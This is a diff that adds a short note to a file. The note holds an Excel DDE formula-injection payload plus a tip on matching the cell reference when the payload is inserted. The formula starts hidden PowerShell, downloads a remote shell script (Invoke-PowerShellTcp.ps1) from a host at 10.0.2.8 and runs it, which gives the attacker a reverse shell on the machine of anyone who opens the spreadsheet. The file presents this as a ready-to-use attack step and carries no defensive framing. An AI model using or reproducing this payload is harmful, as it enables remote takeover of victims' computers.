@@ -1,0 +1,9 @@
+The Command utilized on the Excel Example to execute our payload:
+
+=cmd|'/c powershell.exe -w hidden IEX (New-Object Net.WebClient).DownloadString(\"http://10.0.2.8:8080/Invoke-PowerShellTcp.ps1\");'!_xlbgnm.A1
+
+####
+Note
+####
+
+The last two chracters point to the cell of the spreadsheet make sure these match when adding the command
